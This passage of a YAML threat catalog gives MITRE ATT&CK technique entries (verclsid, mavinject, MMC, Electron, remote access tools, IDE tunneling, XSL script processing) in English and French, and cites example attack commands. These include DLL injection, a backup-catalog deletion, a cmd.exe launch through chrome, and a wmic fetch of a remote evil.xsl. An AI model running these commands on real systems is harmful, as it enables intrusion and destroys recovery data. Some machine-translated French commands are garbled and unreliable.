          \ d\u2019Extension CLSID Verification Host et est responsable de la v\xE9\
          rification de chaque extension de shell avant qu\u2019elle ne soit utilis\xE9\
          e par l\u2019Explorateur Windows ou le Shell Windows. (Citation : WinOSBite\
          \ verclsid.exe)\n\nLes adversaires peuvent abuser de verclsid.exe pour ex\xE9\
          cuter des charges utiles malveillantes. Cela peut \xEAtre r\xE9alis\xE9\
          \ en ex\xE9cutant <code>verclsid.exe /S /C {CLSID},</code> o\xF9 le fichier\
          \ est r\xE9f\xE9renc\xE9 par un identifiant de classe (CLSID), un num\xE9\
          ro d\u2019identification unique utilis\xE9 pour identifier les objets COM.\
          \ Les charges utiles COM ex\xE9cut\xE9es par verclsid.exe peuvent \xEAtre\
          \ capables d\u2019effectuer diverses actions malveillantes, telles que charger\
          \ et ex\xE9cuter des scriptlets COM (SCT) depuis des serveurs distants (similaires\
          \ \xE0 [Regsvr32](https://attack.mitre.org/techniques/T1218/010)). Puisque\
          \ le binaire peut \xEAtre sign\xE9 et/ou natif sur les syst\xE8mes Windows,\
          \ l\u2019ex\xE9cution par proxy via verclsid.exe peut contourner les solutions\
          \ de contr\xF4le d\u2019application qui ne tiennent pas compte de son potentiel\
          \ abus. (Citation : Verclsid LOLBAS)(Citation : Red Canary Verclsid.exe)(Citation\
          \ : BOHOPS abusant du registre COM)(Citation : Nick Tyrer GitHub)\nhttps://attack.mitre.org/techniques/T1218/012"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218.013
    ref_id: T1218.013
    name: Mavinject
    description: "Adversaries may abuse mavinject.exe to proxy execution of malicious\
      \ code. Mavinject.exe is the Microsoft Application Virtualization Injector,\
      \ a Windows utility that can inject code into external processes as part of\
      \ Microsoft Application Virtualization (App-V).(Citation: LOLBAS Mavinject)\n\
      \nAdversaries may abuse mavinject.exe to inject malicious DLLs into running\
      \ processes (i.e. [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001)),\
      \ allowing for arbitrary code execution (ex. <code>C:\\Windows\\system32\\mavinject.exe\
      \ PID /INJECTRUNNING PATH_DLL</code>).(Citation: ATT Lazarus TTP Evolution)(Citation:\
      \ Reaqta Mavinject) Since mavinject.exe may be digitally signed by Microsoft,\
      \ proxying execution via this method may evade detection by security products\
      \ because the execution is masked under a legitimate process. \n\nIn addition\
      \ to [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001),\
      \ Mavinject.exe can also be abused to perform import descriptor injection via\
      \ its  <code>/HMODULE</code> command-line parameter (ex. <code>mavinject.exe\
      \ PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER</code>). This command would\
      \ inject an import table entry consisting of the specified DLL into the module\
      \ at the given base address.(Citation: Mavinject Functionality Deconstructed)\n\
      https://attack.mitre.org/techniques/T1218/013"
    translations:
      fr:
        name: Mavinject
        description: "Les adversaires peuvent abuser mavinject.exe pour ex\xE9cuter\
          \ par procuration de code malveillant. Mavinject.exe est le Microsoft Application\
          \ Virtualization Injector, un utilitaire Windows capable d\u2019injecter\
          \ du code dans des processus externes dans le cadre de Microsoft Application\
          \ Virtualization (App-V). (Citation : LOLBAS Mavinject)\n\nLes adversaires\
          \ peuvent abuser de mavinject.exe pour injecter des DLL malveillants dans\
          \ des processus en cours (par exemple [Injection de biblioth\xE8que \xE0\
          \ liens dynamiques](https://attack.mitre.org/techniques/T1055/001)), permettant\
          \ une ex\xE9cution arbitraire de code (ex. <code>C\_:\\Windows\\system32\\\
          mavinject.exe PID /INJECTRUNNING PATH_DLL</code>). (Citation : ATT Lazarus\
          \ TTP \xC9volution)(Citation : Reaqta Mavinject) Puisque mavinject.exe peuvent\
          \ \xEAtre sign\xE9s num\xE9riquement par Microsoft, l\u2019ex\xE9cution\
          \ par procuration via cette m\xE9thode peut \xE9chapper \xE0 la d\xE9tection\
          \ par les produits de s\xE9curit\xE9 car l\u2019ex\xE9cution est masqu\xE9\
          e par un processus l\xE9gitime. \n\nEn plus de [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001),\
          \ Mavinject.exe peut \xE9galement \xEAtre abus\xE9 pour effectuer l\u2019\
          injection de descripteurs d\u2019importation via son param\xE8tre <code>de\
          \ ligne de commande /HMODULE</code> (ex. <code>mavinject.exe PID /HMODULE=BASE_ADDRESS\
          \ PATH_DLL ORDINAL_NUMBER</code>). Cette commande injecterait une entr\xE9\
          e de table d\u2019importation compos\xE9e de la DLL sp\xE9cifi\xE9e dans\
          \ le module \xE0 l\u2019adresse de base donn\xE9e. (Citation : Fonctionnalit\xE9\
          \ Mavinject D\xE9construite)\nhttps://attack.mitre.org/techniques/T1218/013"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218.014
    ref_id: T1218.014
    name: MMC
    description: "Adversaries may abuse mmc.exe to proxy execution of malicious .msc\
      \ files. Microsoft Management Console (MMC) is a binary that may be signed by\
      \ Microsoft and is used in several ways in either its GUI or in a command prompt.(Citation:\
      \ win_mmc)(Citation: what_is_mmc) MMC can be used to create, open, and save\
      \ custom consoles that contain administrative tools created by Microsoft, called\
      \ snap-ins. These snap-ins may be used to manage Windows systems locally or\
      \ remotely. MMC can also be used to open Microsoft created .msc files to manage\
      \ system configuration.(Citation: win_msc_files_overview)\n\nFor example, <code>mmc\
      \ C:\\Users\\foo\\admintools.msc /a</code> will open a custom, saved console\
      \ msc file in author mode.(Citation: win_mmc) Another common example is <code>mmc\
      \ gpedit.msc</code>, which will open the Group Policy Editor application window.\
      \ \n\nAdversaries may use MMC commands to perform malicious tasks. For example,\
      \ <code>mmc wbadmin.msc delete catalog -quiet</code> deletes the backup catalog\
      \ on the system (i.e. [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490))\
      \ without prompts to the user (Note: <code>wbadmin.msc</code> may only be present\
      \ by default on Windows Server operating systems).(Citation: win_wbadmin_delete_catalog)(Citation:\
      \ phobos_virustotal)\n\nAdversaries may also abuse MMC to execute malicious\
      \ .msc files. For example, adversaries may first create a malicious registry\
      \ Class Identifier (CLSID) subkey, which uniquely identifies a [Component Object\
      \ Model](https://attack.mitre.org/techniques/T1559/001) class object.(Citation:\
      \ win_clsid_key) Then, adversaries may create custom consoles with the \u201C\
      Link to Web Address\u201D snap-in that is linked to the malicious CLSID subkey.(Citation:\
      \ mmc_vulns) Once the .msc file is saved, adversaries may invoke the malicious\
      \ CLSID payload with the following command: <code>mmc.exe -Embedding C:\\path\\\
      to\\test.msc</code>.(Citation: abusing_com_reg)\nhttps://attack.mitre.org/techniques/T1218/014"
    translations:
      fr:
        name: MMC
        description: "Les adversaires peuvent abuser mmc.exe pour ex\xE9cuter par\
          \ procuration de fichiers .msc malveillants. Microsoft Management Console\
          \ (MMC) est un binaire qui peut \xEAtre sign\xE9 par Microsoft et qui est\
          \ utilis\xE9 de plusieurs mani\xE8res, soit dans son interface graphique,\
          \ soit dans une invite de commandes. (Citation : win_mmc)(Citation : what_is_mmc)\
          \ MMC peut \xEAtre utilis\xE9 pour cr\xE9er, ouvrir et sauvegarder des consoles\
          \ personnalis\xE9es contenant des outils d\u2019administration cr\xE9\xE9\
          s par Microsoft, appel\xE9s snap-ins. Ces inserts peuvent \xEAtre utilis\xE9\
          s pour g\xE9rer les syst\xE8mes Windows localement ou \xE0 distance. MMC\
          \ peut \xE9galement \xEAtre utilis\xE9 pour ouvrir des fichiers .msc cr\xE9\
          \xE9s par Microsoft afin de g\xE9rer la configuration syst\xE8me. (Citation\
          \ : win_msc_files_overview)\n\nPar exemple, <code>mmc C\_:\\Users\\foo\\\
          admintools.msc /a</code> ouvre un fichier msc personnalis\xE9 et sauvegard\xE9\
          \ sur console en mode auteur. (Citation : win_mmc) Un autre exemple courant\
          \ est <code>mmc gpedit.msc</code>, qui ouvre la fen\xEAtre de l\u2019application\
          \ de l\u2019\xE9diteur de strat\xE9gie de groupe. \n\nLes adversaires peuvent\
          \ utiliser des commandes MMC pour effectuer des t\xE2ches malveillantes.\
          \ Par exemple, <code>mmc wbadmin.msc delete catalogue -quiet</code> supprime\
          \ le catalogue de sauvegarde sur le syst\xE8me (c\u2019est-\xE0-dire [Inhibt\
          \ System Recovery](https://attack.mitre.org/techniques/T1490)) sans invitation\
          \ \xE0 l\u2019utilisateur (Note : <code>wbadmin.msc</code> peut n\u2019\xEA\
          tre pr\xE9sent par d\xE9faut que sur les syst\xE8mes d\u2019exploitation\
          \ Windows Server). (Citation : win_wbadmin_delete_catalog)(Citation : phobos_virustotal)\n\
          \nLes adversaires peuvent \xE9galement abuser de MMC pour ex\xE9cuter des\
          \ fichiers .msc malveillants. Par exemple, les adversaires peuvent d\u2019\
          abord cr\xE9er une sous-cl\xE9 CLSID (Identifiant de classe de registre\
          \ malveillant), qui identifie de mani\xE8re unique un objet de classe [Mod\xE8\
          le d\u2019objet composant](https://attack.mitre.org/techniques/T1559/001).\
          \ (Citation : win_clsid_key) Ensuite, les adversaires peuvent cr\xE9er des\
          \ consoles personnalis\xE9es avec le snap-in \xAB Link to Web Address \xBB\
          \ li\xE9 \xE0 la sous-cl\xE9 CLSID malveillante. (Citation : mmc_vulns)\
          \ Une fois le fichier .msc sauvegard\xE9, les adversaires peuvent invoquer\
          \ la charge utile malveillante CLSID avec la commande suivante : <code>mmc.exe\
          \ -Embedding C\_:\\path\\to\\test.msc</code>. (Citation : abusing_com_reg)\n\
          https://attack.mitre.org/techniques/T1218/014"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218.015
    ref_id: T1218.015
    name: Electron Applications
    description: 'Adversaries may abuse components of the Electron framework to execute
      malicious code. The Electron framework hosts many common applications such as
      Signal, Slack, and Microsoft Teams.(Citation: Electron 2) Originally developed
      by GitHub, Electron is a cross-platform desktop application development framework
      that employs web technologies like JavaScript, HTML, and CSS.(Citation: Electron
      3) The Chromium engine is used to display web content and Node.js runs the backend
      code.(Citation: Electron 1)


      Due to the functional mechanics of Electron (such as allowing apps to run arbitrary
      commands), adversaries may also be able to perform malicious functions in the
      background potentially disguised as legitimate tools within the framework.(Citation:
      Electron 1) For example, the abuse of `teams.exe` and `chrome.exe` may allow
      adversaries to execute malicious commands as child processes of the legitimate
      application (e.g., `chrome.exe --disable-gpu-sandbox --gpu-launcher="C:\Windows\system32\cmd.exe
      /c calc.exe`).(Citation: Electron 6-8)


      Adversaries may also execute malicious content by planting malicious [JavaScript](https://attack.mitre.org/techniques/T1059/007)
      within Electron applications.(Citation: Electron Security)

      https://attack.mitre.org/techniques/T1218/015'
    translations:
      fr:
        name: "Applications \xE9lectroniques"
        description: "Les adversaires peuvent abuser de composants du cadre Electron\
          \ pour ex\xE9cuter du code malveillant. Le framework Electron h\xE9berge\
          \ de nombreuses applications courantes telles que Signal, Slack et Microsoft\
          \ Teams. (Citation : \xC9lectron 2) Initialement d\xE9velopp\xE9 par GitHub,\
          \ Electron est un cadre de d\xE9veloppement d\u2019applications de bureau\
          \ multiplateforme qui utilise des technologies web telles que JavaScript,\
          \ HTML et CSS. (Citation : \xC9lectron 3) Le moteur Chromium est utilis\xE9\
          \ pour afficher le contenu web et Node.js ex\xE9cute le code backend. (Citation\
          \ : \xC9lectron 1)\n\nEn raison des m\xE9canismes fonctionnels d\u2019Electron\
          \ (comme permettre aux applications d\u2019ex\xE9cuter des commandes arbitraires),\
          \ les adversaires peuvent \xE9galement \xEAtre capables d\u2019ex\xE9cuter\
          \ des fonctions malveillantes en arri\xE8re-plan, potentiellement d\xE9\
          guis\xE9es en outils l\xE9gitimes dans le cadre du cadre. (Citation : \xC9\
          lectron 1) Par exemple, l\u2019abus de \xAB teams.exe \xBB et \xAB chrome.exe\
          \ \xBB peut permettre aux adversaires d\u2019ex\xE9cuter des commandes malveillantes\
          \ en tant que processus enfants de l\u2019application l\xE9gitime (par exemple,\
          \ \xAB chrome.exe --disable-gpu-sandbox --gpu-launcher=\"C\_:\\Windows\\\
          system32\\cmd.exe /c calc.exe \xBB). (Citation : Electron 6-8)\n\nLes adversaires\
          \ peuvent \xE9galement ex\xE9cuter du contenu malveillant en implantant\
          \ du [JavaScript](https://attack.mitre.org/techniques/T1059/007) malveillant\
          \ dans les applications Electron. (Citation : S\xE9curit\xE9 \xC9lectronique)\n\
          https://attack.mitre.org/techniques/T1218/015"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1219
    ref_id: T1219
    name: Remote Access Tools
    description: "An adversary may use legitimate remote access tools to establish\
      \ an interactive command and control channel within a network. Remote access\
      \ tools create a session between two trusted hosts through a graphical interface,\
      \ a command line interaction, a protocol tunnel via development or management\
      \ software, or hardware-level access such as KVM (Keyboard, Video, Mouse) over\
      \ IP solutions. Desktop support software (usually graphical interface) and remote\
      \ management software (typically command line interface) allow a user to control\
      \ a computer remotely as if they are a local user inheriting the user or software\
      \ permissions. This software is commonly used for troubleshooting, software\
      \ installation, and system management.(Citation: Symantec Living off the Land)(Citation:\
      \ CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy) Adversaries\
      \ may similarly abuse response features included in EDR and other defensive\
      \ tools that enable remote access.\n\nRemote access tools may be installed and\
      \ used post-compromise as an alternate communications channel for redundant\
      \ access or to establish an interactive remote desktop session with the target\
      \ system. It may also be used as a malware component to establish a reverse\
      \ connection or back-connect to a service or adversary-controlled system.\n\n\
      Installation of many remote access tools may also include persistence (e.g.,\
      \ the software's installation routine creates a [Windows Service](https://attack.mitre.org/techniques/T1543/003)).\
      \ Remote access modules/features may also exist as part of otherwise existing\
      \ software (e.g., Google Chrome\u2019s Remote Desktop).(Citation: Google Chrome\
      \ Remote Desktop)(Citation: Chrome Remote Desktop)\nhttps://attack.mitre.org/techniques/T1219"
    translations:
      fr:
        name: "Outils d\u2019acc\xE8s \xE0 distance"
        description: "Un adversaire peut utiliser des outils d\u2019acc\xE8s \xE0\
          \ distance l\xE9gitimes pour \xE9tablir un canal de commande et de contr\xF4\
          le interactif au sein d\u2019un r\xE9seau. Les outils d\u2019acc\xE8s \xE0\
          \ distance cr\xE9ent une session entre deux h\xF4tes de confiance via une\
          \ interface graphique, une interaction en ligne de commande, un tunnel de\
          \ protocole via un logiciel de d\xE9veloppement ou de gestion, ou un acc\xE8\
          s mat\xE9riel tel que des solutions KVM (Clavier, Vid\xE9o, Souris) via\
          \ IP. Les logiciels de support de bureau (g\xE9n\xE9ralement une interface\
          \ graphique) et les logiciels de gestion \xE0 distance (g\xE9n\xE9ralement\
          \ une interface en ligne de commande) permettent \xE0 un utilisateur de\
          \ contr\xF4ler un ordinateur \xE0 distance comme s\u2019il \xE9tait un utilisateur\
          \ local h\xE9ritant des permissions utilisateur ou logicielle. Ce logiciel\
          \ est couramment utilis\xE9 pour le d\xE9pannage, l\u2019installation de\
          \ logiciels et la gestion du syst\xE8me. (Citation : Symantec vivant de\
          \ la terre)(Citation : Rapport mondial sur les menaces de CrowdStrike 2015)(Citation\
          \ : \xC9quipe Spy du blog CrySys) Les adversaires peuvent \xE9galement abuser\
          \ des fonctionnalit\xE9s de r\xE9ponse incluses dans l\u2019EDR et d\u2019\
          autres outils d\xE9fensifs permettant un acc\xE8s \xE0 distance.\n\nLes\
          \ outils d\u2019acc\xE8s \xE0 distance peuvent \xEAtre install\xE9s et utilis\xE9\
          s apr\xE8s compromis comme canal de communication alternatif pour un acc\xE8\
          s redondant ou pour \xE9tablir une session interactive de bureau \xE0 distance\
          \ avec le syst\xE8me cible. Il peut \xE9galement \xEAtre utilis\xE9 comme\
          \ composant malveillant pour \xE9tablir une connexion inverse ou une connexion\
          \ inverse \xE0 un service ou un syst\xE8me contr\xF4l\xE9 par un adversaire.\n\
          \nL\u2019installation de nombreux outils d\u2019acc\xE8s \xE0 distance peut\
          \ \xE9galement inclure la persistance (par exemple, la routine d\u2019installation\
          \ du logiciel cr\xE9e un [Service Windows](https://attack.mitre.org/techniques/T1543/003)).\
          \ Des modules/fonctionnalit\xE9s d\u2019acc\xE8s \xE0 distance peuvent \xE9\
          galement exister dans le cadre de logiciels existants (par exemple, le Bureau\
          \ \xE0 distance de Google Chrome). (Citation : bureau \xE0 distance de Google\
          \ Chrome)(Citation : Bureau \xE0 distance Chrome)\nhttps://attack.mitre.org/techniques/T1219"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1219.001
    ref_id: T1219.001
    name: IDE Tunneling
    description: 'Adversaries may abuse Integrated Development Environment (IDE) software
      with remote development features to establish an interactive command and control
      channel on target systems within a network. IDE tunneling combines SSH, port
      forwarding, file sharing, and debugging into a single secure connection, letting
      developers work on remote systems as if they were local. Unlike SSH and port
      forwarding, IDE tunneling encapsulates an entire session and may use proprietary
      tunneling protocols alongside SSH, allowing adversaries to blend in with legitimate
      development workflows. Some IDEs, like Visual Studio Code, also provide CLI
      tools (e.g., `code tunnel`) that adversaries may use to programmatically establish
      tunnels and generate web-accessible URLs for remote access. These tunnels can
      be authenticated through accounts such as GitHub, enabling the adversary to
      control the compromised system via a legitimate developer portal.(Citation:
      sentinelone operationDigitalEye Dec 2024)(Citation: Unit42 Chinese VSCode 06
      September 2024)(Citation: Thornton tutorial VSCode shell September 2023)


      Additionally, adversaries may use IDE tunneling for persistence. Some IDEs,
      such as Visual Studio Code and JetBrains, support automatic reconnection. Adversaries
      may configure the IDE to auto-launch at startup, re-establishing the tunnel
      upon execution. Compromised developer machines may also be exploited as jump
      hosts to move further into the network.


      IDE tunneling tools may be built-in or installed as [IDE Extensions](https://attack.mitre.org/techniques/T1176/002).

      https://attack.mitre.org/techniques/T1219/001'
    translations:
      fr:
        name: Tunnel IDE
        description: "Les adversaires peuvent abuser du logiciel Integrated Development\
          \ Environment (IDE) avec des fonctionnalit\xE9s de d\xE9veloppement \xE0\
          \ distance pour \xE9tablir un canal de commande et de contr\xF4le interactif\
          \ sur les syst\xE8mes cibles au sein d\u2019un r\xE9seau. Le tunneling IDE\
          \ combine SSH, redirection de ports, partage de fichiers et d\xE9bogage\
          \ en une seule connexion s\xE9curis\xE9e, permettant aux d\xE9veloppeurs\
          \ de travailler sur des syst\xE8mes distants comme s\u2019ils \xE9taient\
          \ locaux. Contrairement au SSH et au transfert de port, le tunneling IDE\
          \ englobe une session enti\xE8re et peut utiliser des protocoles de tunneling\
          \ propri\xE9taires en parall\xE8le avec SSH, permettant aux adversaires\
          \ de s\u2019int\xE9grer dans les flux de travail de d\xE9veloppement l\xE9\
          gitimes. Certains IDE, comme Visual Studio Code, proposent \xE9galement\
          \ des outils de ligne de commande (par exemple, un \xAB tunnel de code \xBB\
          ) que les adversaires peuvent utiliser pour \xE9tablir des tunnels programmatiquement\
          \ et g\xE9n\xE9rer des URL accessibles sur le web pour un acc\xE8s \xE0\
          \ distance. Ces tunnels peuvent \xEAtre authentifi\xE9s via des comptes\
          \ tels que GitHub, permettant \xE0 l\u2019adversaire de contr\xF4ler le\
          \ syst\xE8me compromis via un portail de d\xE9veloppeur l\xE9gitime. (Citation\
          \ : op\xE9ration sentinelone DigitalEye d\xE9c. 2024)(Citation : Unit42\
          \ VSCode chinois 06 septembre 2024)(Citation : tutoriel Thornton VSCode\
          \ shell septembre 2023)\n\nDe plus, les adversaires peuvent utiliser le\
          \ tunneling IDE pour la persistance. Certains IDE, comme Visual Studio Code\
          \ et JetBrains, prennent en charge la reconnexion automatique. Les adversaires\
          \ peuvent configurer l\u2019IDE pour qu\u2019il se lance automatiquement\
          \ au d\xE9marrage, r\xE9tablissant ainsi le tunnel \xE0 l\u2019ex\xE9cution.\
          \ Les machines d\xE9veloppeuses compromises peuvent \xE9galement \xEAtre\
          \ exploit\xE9es comme h\xF4tes de saut pour s\u2019enfoncer davantage dans\
          \ le r\xE9seau.\n\nLes outils de tunneling IDE peuvent \xEAtre int\xE9gr\xE9\
          s ou install\xE9s sous forme de [ID Extensions](https://attack.mitre.org/techniques/T1176/002).\n\
          https://attack.mitre.org/techniques/T1219/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1219.002
    ref_id: T1219.002
    name: Remote Desktop Software
    description: "An adversary may use legitimate desktop support software to establish\
      \ an interactive command and control channel to target systems within networks.\
      \ Desktop support software provides a graphical interface for remotely controlling\
      \ another computer, transmitting the display output, keyboard input, and mouse\
      \ control between devices using various protocols. Desktop support software,\
      \ such as `VNC`, `Team Viewer`, `AnyDesk`, `ScreenConnect`, `LogMein`, `AmmyyAdmin`,\
      \ and other remote monitoring and management (RMM) tools, are commonly used\
      \ as legitimate technical support software and may be allowed by application\
      \ control within a target environment.(Citation: Symantec Living off the Land)(Citation:\
      \ CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy) \n \n\
      Remote access modules/features may also exist as part of otherwise existing\
      \ software such as Zoom or Google Chrome\u2019s Remote Desktop.(Citation: Google\
      \ Chrome Remote Desktop)(Citation: Chrome Remote Desktop)\nhttps://attack.mitre.org/techniques/T1219/002"
    translations:
      fr:
        name: "Logiciels de bureau \xE0 distance"
        description: "Un adversaire peut utiliser un logiciel de support de bureau\
          \ l\xE9gitime pour \xE9tablir un canal de commande et de contr\xF4le interactif\
          \ afin de cibler les syst\xE8mes au sein des r\xE9seaux. Le logiciel de\
          \ support de bureau fournit une interface graphique pour contr\xF4ler \xE0\
          \ distance un autre ordinateur, transmettant la sortie d\u2019affichage,\
          \ l\u2019entr\xE9e clavier et le contr\xF4le de la souris entre les appareils\
          \ \xE0 l\u2019aide de divers protocoles. Les logiciels de support de bureau,\
          \ tels que \xAB VNC \xBB, \xAB Team Viewer \xBB, \xAB AnyDesk \xBB, \xAB\
          \ ScreenConnect \xBB, \xAB LogMein \xBB, \xAB AmmyyAdmin \xBB et d\u2019\
          autres outils de surveillance et de gestion \xE0 distance (RMM), sont couramment\
          \ utilis\xE9s comme logiciels de support technique l\xE9gitimes et peuvent\
          \ \xEAtre autoris\xE9s par le contr\xF4le d\u2019application dans un environnement\
          \ cible. (Citation : Symantec vivant de la terre)(Citation : Rapport mondial\
          \ sur les menaces de CrowdStrike 2015)(Citation : \xC9quipe Spy du blog\
          \ CrySys) \n \nDes modules/fonctionnalit\xE9s d\u2019acc\xE8s \xE0 distance\
          \ peuvent \xE9galement exister dans des logiciels existants tels que Zoom\
          \ ou le Bureau \xE0 distance de Google Chrome. (Citation : bureau \xE0 distance\
          \ de Google Chrome)(Citation : Bureau \xE0 distance Chrome)\nhttps://attack.mitre.org/techniques/T1219/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1219.003
    ref_id: T1219.003
    name: Remote Access Hardware
    description: "An adversary may use legitimate remote access hardware to establish\
      \ an interactive command and control channel to target systems within networks.\
      \ These services, including IP-based keyboard, video, or mouse (KVM) devices\
      \ such as TinyPilot and PiKVM, are commonly used as legitimate tools and may\
      \ be allowed by peripheral device policies within a target environment.  \n\n\
      Remote access hardware may be physically installed and used post-compromise\
      \ as an alternate communications channel for redundant access or as a way to\
      \ establish an interactive remote session with the target system. Using hardware-based\
      \ remote access tools may allow threat actors to bypass software security solutions\
      \ and gain more control over the compromised device(s).(Citation: Palo Alto\
      \ Unit 42 North Korean IT Workers 2024)(Citation: Google Cloud Threat Intelligence\
      \ DPRK IT Workers 2024)\nhttps://attack.mitre.org/techniques/T1219/003"
    translations:
      fr:
        name: "Mat\xE9riel d\u2019acc\xE8s \xE0 distance"
        description: "Un adversaire peut utiliser du mat\xE9riel d\u2019acc\xE8s \xE0\
          \ distance l\xE9gitime pour \xE9tablir un canal de commande et de contr\xF4\
          le interactif afin de cibler les syst\xE8mes au sein des r\xE9seaux. Ces\
          \ services, y compris les dispositifs clavier, vid\xE9o ou souris (KVM)\
          \ bas\xE9s sur IP tels que TinyPilot et PiKVM, sont couramment utilis\xE9\
          s comme outils l\xE9gitimes et peuvent \xEAtre autoris\xE9s par les politiques\
          \ des p\xE9riph\xE9riques dans un environnement cible.  \n\nLe mat\xE9riel\
          \ d\u2019acc\xE8s \xE0 distance peut \xEAtre physiquement install\xE9 et\
          \ utilis\xE9 apr\xE8s compromis comme canal de communication alternatif\
          \ pour un acc\xE8s redondant ou comme moyen d\u2019\xE9tablir une session\
          \ interactive \xE0 distance avec le syst\xE8me cible. L\u2019utilisation\
          \ d\u2019outils d\u2019acc\xE8s \xE0 distance mat\xE9riels peut permettre\
          \ aux acteurs malveillants de contourner les solutions de s\xE9curit\xE9\
          \ logicielle et d\u2019obtenir un meilleur contr\xF4le sur le(s) p\xE9riph\xE9\
          rique(s) compromis. (Citation : Unit\xE9 42 de Palo Alto Travailleurs IT\
          \ nord-cor\xE9ens 2024)(Citation : Google Cloud Threat Intelligence DPRK\
          \ IT Workers 2024)\nhttps://attack.mitre.org/techniques/T1219/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1220
    ref_id: T1220
    name: XSL Script Processing
    description: "Adversaries may bypass application control and obscure execution\
      \ of code by embedding scripts inside XSL files. Extensible Stylesheet Language\
      \ (XSL) files are commonly used to describe the processing and rendering of\
      \ data within XML files. To support complex operations, the XSL standard includes\
      \ support for embedded scripting in various languages. (Citation: Microsoft\
      \ XSLT Script Mar 2017)\n\nAdversaries may abuse this functionality to execute\
      \ arbitrary files while potentially bypassing application control. Similar to\
      \ [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127),\
      \ the Microsoft common line transformation utility binary (msxsl.exe) (Citation:\
      \ Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript\
      \ embedded within local or remote (URL referenced) XSL files. (Citation: Penetration\
      \ Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default,\
      \ an adversary will likely need to package it with dropped files. (Citation:\
      \ Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an\
      \ XML source file and an XSL stylesheet. Since the XSL file is valid XML, the\
      \ adversary may call the same XSL file twice. When using msxsl.exe adversaries\
      \ may also give the XML/XSL files an arbitrary file extension.(Citation: XSL\
      \ Bypass Mar 2019)\n\nCommand-line examples:(Citation: Penetration Testing Lab\
      \ MSXSL July 2017)(Citation: XSL Bypass Mar 2019)\n\n* <code>msxsl.exe customers[.]xml\
      \ script[.]xsl</code>\n* <code>msxsl.exe script[.]xsl script[.]xsl</code>\n\
      * <code>msxsl.exe script[.]jpeg script[.]jpeg</code>\n\nAnother variation of\
      \ this technique, dubbed \u201CSquiblytwo\u201D, involves using [Windows Management\
      \ Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript\
      \ or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can\
      \ also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1218/010)/\
      \ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries\
      \ may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)\
      \ provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)\n\
      \nCommand-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)\n\
      \n* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>\n* Remote\
      \ File: <code>wmic os get /FORMAT:\u201Dhttps[:]//example[.]com/evil[.]xsl\u201D\
      </code>\nhttps://attack.mitre.org/techniques/T1220"
    translations:
      fr:
        name: Traitement des scripts XSL
        description: "Les adversaires peuvent contourner le contr\xF4le de l\u2019\
          application et obscurcir l\u2019ex\xE9cution du code en int\xE9grant des\
          \ scripts dans des fichiers XSL. Les fichiers extensibles Stylesheet Language\
          \ (XSL) sont couramment utilis\xE9s pour d\xE9crire le traitement et le\
          \ rendu des donn\xE9es au sein de fichiers XML. Pour supporter des op\xE9\
          rations complexes, la norme XSL inclut la prise en charge du scripting embarqu\xE9\
          \ dans divers langages. (Citation : Microsoft XSLT Script mars 2017)\n\n\
          Les adversaires peuvent abuser de cette fonctionnalit\xE9 pour ex\xE9cuter\
          \ des fichiers arbitraires tout en contournant potentiellement le contr\xF4\
          le de l\u2019application. Similaire \xE0 [Trusted Developer Utilities Proxy\
          \ Execution](https://attack.mitre.org/techniques/T1127), l\u2019utilitaire\
          \ binaire (msxsl.exe) de transformation de ligne commun de Microsoft (Citation\
          \ : Microsoft msxsl.exe) peut \xEAtre install\xE9 et utilis\xE9 pour ex\xE9\
          cuter du JavaScript malveillant int\xE9gr\xE9 dans des fichiers XSL locaux\
          \ ou distants (r\xE9f\xE9renc\xE9s par URL). (Citation : Laboratoire de\
          \ tests d\u2019intrusion MSXSL, juillet 2017) Comme msxsl.exe n\u2019est\
          \ pas install\xE9 par d\xE9faut, un adversaire devra probablement l\u2019\
          empaqueter avec des fichiers supprim\xE9s. (Citation : Reaqta MSXSL Spearphishing\
          \ MAR 2018) Msxsl.exe prend deux arguments principaux, un fichier source\
          \ XML et une feuille de style XSL. Puisque le fichier XSL est un XML valide,\
          \ l\u2019adversaire peut appeler le m\xEAme fichier XSL deux fois. Lors\
          \ de l\u2019utilisation de msxsl.exe adversaires peuvent \xE9galement attribuer\
          \ aux fichiers XML/XSL une extension de fichier arbitraire. (Citation :\
          \ D\xE9rivation XSL mars 2019)\n\nExemples en ligne de commande : (Citation\
          \ : Penetration Testing Lab MSXSL juillet 2017) (Citation : XSL Bypass mars\
          \ 2019)\n\n* <code>msxsl.exe clients[.]Script xml[.]XSL</code>\n* <code>msxsl.exe\
          \ script[.]Script XSL[.]XSL</code>\n* <code>msxsl.exe script[.]Script jpeg[.]jpeg</code>\n\
          \nUne autre variante de cette technique, appel\xE9e \xAB Squiblytwo \xBB\
          , consiste \xE0 utiliser [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)\
          \ pour invoquer JScript ou VBScript dans un fichier XSL. (Citation : LOLBAS\
          \ Wmic) Cette technique peut \xE9galement ex\xE9cuter des scripts locaux/distants\
          \ et, \xE0 l\u2019instar de son homologue [Regsvr32](https://attack.mitre.org/techniques/T1218/010)/\xAB\
